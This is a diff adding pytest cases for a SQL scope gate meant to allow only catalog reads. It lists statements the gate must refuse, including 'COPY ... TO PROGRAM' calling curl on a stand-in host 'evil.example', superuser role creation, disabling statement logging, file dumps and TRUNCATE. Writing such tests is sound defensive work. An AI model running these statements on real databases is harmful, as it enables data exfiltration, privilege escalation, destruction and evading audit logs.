@@ -345,3 +345,84 @@ def test_an_ordinary_cte_query_still_works(sql):
     """The control. Refusing every WITH would be a cheap way to pass the tests
     above and would break the legitimate catalog queries CTEs are used for."""
     check_query_scope(sql, platform="postgres", scope=_postgres_scope())
+
+
+# --- everything that is not a read -----------------------------------------
+#
+# Grouped by what the statement ACHIEVES, not by keyword, because both gaps
+# found here were spelled like reads: a data-modifying CTE parses to a Select,
+# and `SELECT ... INTO` puts the table it creates in an `into` arg rather than
+# a Create node. A statement-type check reading the root saw neither.
+#
+# SELECT INTO was refused before this only when its target happened to be
+# unqualified -- `SELECT * INTO information_schema.evil FROM
+# information_schema.tables` named a target inside the permitted schema and
+# passed. Caught by accident is not caught.
+
+
+@pytest.mark.parametrize(
+    "dialect,sql",
+    [
+        # writes data
+        (
+            "tsql",
+            "SELECT * INTO information_schema.evil FROM information_schema.tables",
+        ),
+        (
+            "postgres",
+            "WITH x AS (INSERT INTO information_schema.t VALUES (1) RETURNING 1) SELECT * FROM x",
+        ),
+        (
+            "postgres",
+            "CREATE TABLE information_schema.x AS SELECT * FROM information_schema.tables",
+        ),
+        ("postgres", "TRUNCATE information_schema.tables"),
+        ("postgres", "CREATE TEMP TABLE t AS SELECT 1"),
+        ("snowflake", "CREATE OR REPLACE VIEW information_schema.v AS SELECT 1"),
+        # writes a file, or hands one to a program
+        ("postgres", "COPY (SELECT * FROM information_schema.tables) TO '/tmp/out'"),
+        ("postgres", "COPY information_schema.tables TO PROGRAM 'curl evil.example'"),
+        ("mysql", "SELECT * FROM information_schema.tables INTO OUTFILE '/tmp/x'"),
+        ("mysql", "SELECT * FROM information_schema.tables INTO DUMPFILE '/tmp/x'"),
+        ("snowflake", "COPY INTO 's3://bucket/x' FROM information_schema.tables"),
+        ("bigquery", "EXPORT DATA OPTIONS(uri='gs://b/x') AS SELECT 1"),
+        # changes who can do what
+        ("postgres", "GRANT SELECT ON information_schema.tables TO PUBLIC"),
+        ("postgres", "REVOKE ALL ON information_schema.tables FROM PUBLIC"),
+        ("postgres", "CREATE ROLE evil SUPERUSER"),
+        ("postgres", "ALTER USER u WITH PASSWORD 'x'"),
+        # runs code the gate cannot see into
+        ("postgres", "DO $$ BEGIN PERFORM 1; END $$"),
+        ("postgres", "CALL some_proc()"),
+        ("tsql", "EXEC sp_executesql N'SELECT 1'"),
+        ("snowflake", "EXECUTE IMMEDIATE 'SELECT 1'"),
+        # changes session or system state
+        ("postgres", "SET search_path TO evil"),
+        ("snowflake", "ALTER SESSION SET QUERY_TAG = 'x'"),
+        ("postgres", "ALTER SYSTEM SET log_statement = 'none'"),
+        # takes locks a production writer would wait on
+        ("postgres", "SELECT * FROM information_schema.tables FOR UPDATE"),
+        ("postgres", "SELECT * FROM information_schema.tables FOR SHARE"),
+        ("postgres", "LOCK TABLE information_schema.tables IN ACCESS EXCLUSIVE MODE"),
+    ],
+)
+def test_a_statement_that_is_not_a_read_is_refused(dialect, sql):
+    with pytest.raises(SqlScopeError):
+        check_query_scope(sql, platform=dialect, scope=_postgres_scope())
+
+
+@pytest.mark.parametrize(
+    "dialect,sql",
+    [
+        ("postgres", "SELECT * FROM information_schema.tables"),
+        (
+            "postgres",
+            "WITH t AS (SELECT table_name FROM information_schema.tables) SELECT * FROM t",
+        ),
+        ("postgres", "SELECT count(*) FROM information_schema.columns"),
+    ],
+)
+def test_an_ordinary_catalog_read_still_works(dialect, sql):
+    """The control for the whole list above. Refusing everything would pass
+    every case in it and make the command useless."""
+    check_query_scope(sql, platform=dialect, scope=_postgres_scope())
